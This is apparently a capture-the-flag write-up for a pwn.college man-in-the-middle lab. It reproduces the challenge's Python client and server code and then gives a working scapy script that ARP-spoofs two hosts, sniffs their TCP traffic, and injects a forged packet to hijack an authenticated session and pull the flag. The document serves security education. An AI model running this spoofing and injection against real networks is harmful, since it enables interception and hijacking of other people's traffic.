---
tags: ["Computer Networking"]
title: "Man-in-the-middle"
description: Man-in-the-middle
reference: https://pwn.college/intro-to-cybersecurity/intercepting-communication/
---

# Problem

Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.

# Solution

## 1. see how 10.0.0.2 communicate with 10.0.0.3

10.0.0.2 and 10.0.0.3 have a shared secret.

```python
#!/usr/bin/exec-suid --real -- /usr/bin/python -I

import multiprocessing
import os
import socket
import time

import psutil
from dojjail import Host, Network

flag = open("/flag").read()
parent_process = psutil.Process(os.getppid())

class AuthenticatedClientHost(Host):
    def entrypoint(self):
        while True:
            try:
                client_socket = socket.socket()
                client_socket.connect(("10.0.0.3", 31337))

                assert client_socket.recv(1024) == b"secret: "
                secret = bytes(server_host.secret)  # Get the secret out-of-band
                time.sleep(1)
                client_socket.sendall(secret.hex().encode())

                assert client_socket.recv(1024) == b"command: "
                time.sleep(1)
                client_socket.sendall(b"echo")
                time.sleep(1)
                client_socket.sendall(b"Hello, World!")
                assert client_socket.recv(1024) == b"Hello, World!"

                client_socket.close()
                time.sleep(1)

            except (OSError, ConnectionError, TimeoutError, AssertionError):
                continue

class AuthenticatedServerHost(Host):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.secret = multiprocessing.Array("B", 32)

    def entrypoint(self):
        server_socket = socket.socket()
        server_socket.bind(("0.0.0.0", 31337))
        server_socket.listen()
        while True:
            try:
                connection, _ = server_socket.accept()

                self.secret[:] = os.urandom(32)
                time.sleep(1)
                connection.sendall(b"secret: ")
                secret = bytes.fromhex(connection.recv(1024).decode())
                if secret != bytes(self.secret):
                    connection.close()
                    continue

                time.sleep(1)
                connection.sendall(b"command: ")
                command = connection.recv(1024).decode().strip()

                if command == "echo":
                    data = connection.recv(1024)
                    time.sleep(1)
                    connection.sendall(data)
                elif command == "flag":
                    time.sleep(1)
                    connection.sendall(flag.encode())

                connection.close()
            except ConnectionError:
                continue

user_host = Host("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
```

## 2. make sure ip forwarding is enabled

We need this for forwarding packets from/to `10.0.0.2` and `10.0.0.3`.

```
hacker@intercepting-communication~man-in-the-middle:~$ sysctl net.ipv4.ip_forward
net.ipv4.ip_forward = 1
```

## 3.

1. Use ARP Spoofing to make IP packets to 10.0.0.3/10.0.0.2 will send to 10.0.0.1 eth device
2. When we capture the `command: ` TCP packet from `10.0.0.3`, we impersonate `10.0.0.2` to send the `flag` TCP packet to `10.0.0.3` so that `10.0.0.3` will send out the flag.

```python
1	from scapy.all import *
2	from scapy.layers.inet import *
3	from scapy.layers.l2 import *
4	
5	interface = "eth0"
6	local_mac = get_if_hwaddr(interface)
7	local_ip = "10.0.0.1"
8	ip1 = "10.0.0.2"
9	ip2 = "10.0.0.3"
10	
11	mac1=getmacbyip(ip=ip1)
12	mac2=getmacbyip(ip=ip2)
13	
14	eth=Ether(src=local_mac,dst="ff:ff:ff:ff:ff:ff")
15	arp1=ARP(op="is-at",hwsrc=local_mac, hwdst=mac2,psrc=ip1,pdst=ip2)
16	arp2=ARP(op="is-at",hwsrc=local_mac, hwdst=mac1,psrc=ip2,pdst=ip1)
17	sendp(eth/arp1,iface=interface)
18	sendp(eth/arp2,iface=interface)
19	
20	def process(pkt:Packet):
21	    try:
22	        print(pkt["Ether"].src, pkt["Ether"].dst, pkt["IP"].src, pkt["IP"].dst, pkt["TCP"].load)
23	        if pkt['TCP'].load==b"command: " and pkt["IP"].dst == ip1:
24	            forged = Ether(dst=mac2, src=local_mac) / IP(
25	                src=pkt[IP].dst,
26	                dst=pkt[IP].src
27	            ) / TCP(
28	                sport=pkt[TCP].dport,
29	                dport=pkt[TCP].sport,
30	                seq=pkt[TCP].ack,
31	                ack=pkt[TCP].seq + 1,
32	                flags="PA"
33	            ) / Raw(b"flag")
34	
35	            sendp(forged, iface="eth0")
36	    except Exception:
37	        pass
38	
39	sniff(iface=interface,filter="tcp",prn=process)
```
